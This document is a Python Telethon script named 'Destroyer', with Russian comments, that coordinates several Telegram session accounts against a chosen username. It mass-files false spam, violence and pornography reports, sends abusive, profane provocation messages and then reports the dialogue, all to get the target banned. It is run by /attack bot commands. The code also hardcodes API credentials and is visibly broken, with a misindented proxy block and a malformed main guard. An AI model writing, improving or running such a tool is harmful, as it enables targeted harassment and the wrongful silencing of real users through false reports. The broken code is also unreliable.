import asyncio
import random
import os
import logging
from telethon import TelegramClient, events, functions, types
from telethon.tl.functions.messages import ReportRequest
from telethon.tl.types import InputReportReasonSpam, InputReportReasonOther, InputReportReasonViolence, InputReportReasonPornography
from telethon.errors import FloodWaitError
import socks
import aiohttp

# ============= КОНФИГ =============
API_ID = 8716988686        # ТВОЙ API ID
API_HASH = 'AAH_yiUoV9PskanwmkkPkfMC7MKHRIlLrY0'  # ТВОЙ API HASH
USE_PROXY = False       # True если хочешь прокси
PROXY = {
    'proxy_type': socks.SOCKS5,
    'addr': '127.0.0.1',
    'port': 9050
}

# Список аккаунтов-жертв (файлы сессий, например: acc1.session, acc2.session)
SESSION_FILES = ['acc1.session', 'acc2.session', 'acc3.session']  

# Настройки атаки
REPORTS_PER_CYCLE = 20        # Сколько репортов за раз
ATTACK_INTENSITY = 0.1        # Задержка между действиями (сек), меньше = быстрее, но риск бан
PROVOCATION_MESSAGES = [
    "ты хуйло", "иди нахуй", "ссылка на спам: t.me/+spamchannel",
    "купил аккаунт? ебаный нарик", "твой акк сольют сегодня"
]
# =================================

logging.basicConfig(level=logging.WARNING)
log = logging.getLogger('Destroyer')

active_attacks = {}
sessions = []

async def report_target(client, target_username, count=REPORTS_PER_CYCLE):
    """Насилуем репортами с одного клиента"""
    try:
        entity = await client.get_entity(target_username)
        reported = 0
        async for msg in client.iter_messages(entity, limit=count):
            try:
                await client(ReportRequest(
                    peer=entity,
                    id=[msg.id],
                    reason=random.choice([InputReportReasonSpam(), InputReportReasonViolence(), InputReportReasonPornography()]),
                    message='Нарушение правил, угрозы, спам'
                ))
                reported += 1
                await asyncio.sleep(ATTACK_INTENSITY)
            except FloodWaitError as e:
                log.warning(f'Flood wait {e.seconds}s')
                await asyncio.sleep(e.seconds)
            except:
                pass
        return reported
    except Exception as e:
        log.error(f'Report error: {e}')
        return 0

async def provoke_target(client, target_username):
    """Провоцируем цель на ответ, чтобы потом зарепортить диалог"""
    try:
        entity = await client.get_entity(target_username)
        msg_text = random.choice(PROVOCATION_MESSAGES)
        await client.send_message(entity, msg_text)
        await asyncio.sleep(1)
        # Репортим сам диалог
        await client(functions.messages.ReportRequest(
            peer=entity,
            id=[(await client.get_messages(entity, limit=1))[0].id],
            reason=InputReportReasonSpam(),
            message='Агрессия и спам в ЛС'
        ))
        return True
    except:
        return False

async def destroy_account(target_username, duration_seconds=60):
    """Запуск всех клиентов на одну цель"""
    tasks = []
    for client_obj in sessions:
        tasks.append(run_attack_for_client(client_obj, target_username, duration_seconds))
    await asyncio.gather(*tasks)

async def run_attack_for_client(client_obj, target, duration):
    start = asyncio.get_event_loop().time()
    total_reports = 0
    while asyncio.get_event_loop().time() - start < duration:
        rep = await report_target(client_obj, target)
        total_reports += rep
        await provoke_target(client_obj, target)
        await asyncio.sleep(random.uniform(2, 5))
    log.info(f'Client {client_obj.session.filename} сделал {total_reports} репортов')

async def main():
    # Инициализация сессий
    for sess_file in SESSION_FILES:
        if os.path.exists(sess_file):
            client = TelegramClient(sess_file, API_ID, API_HASH)

if USE_PROXY:
                client.set_proxy(PROXY)
            await client.start()
            sessions.append(client)
            log.info(f'Загружен аккаунт: {sess_file}')
        else:
            log.warning(f'Файл сессии {sess_file} не найден, пропускаем')
    
    if not sessions:
        print('Нет ни одной сессии! Создай через python -c "from telethon import TelegramClient; c=TelegramClient(\'acc1\', API_ID, API_HASH); c.start()"')
        return
    
    @client.on(events.NewMessage(pattern='/start'))
    async def start_cmd(event):
        await event.reply('Я Destroyer. /attack @username 60 - атака на 60 секунд. /stop')

    @client.on(events.NewMessage(pattern='/attack'))
    async def attack_cmd(event):
        args = event.raw_text.split()
        if len(args) < 3:
            await event.reply('Использование: /attack @username секунды')
            return
        target = args[1].replace('@', '')
        duration = int(args[2])
        active_attacks[target] = True
        await event.reply(f'🚀 Начинаю снос @{target} на {duration} секунд с {len(sessions)} аккаунтами')
        await destroy_account(target, duration)
        await event.reply(f'✅ Закончил с @{target}')
        del active_attacks[target]

    @client.on(events.NewMessage(pattern='/stop'))
    async def stop_cmd(event):
        for t in list(active_attacks.keys()):
            active_attacks[t] = False
        await event.reply('Атаки остановлены')

    print('Destroyer запущен. Команды: /attack @username 30 , /stop')
    await client.run_until_disconnected()

if name == 'main':
    asyncio.run(main())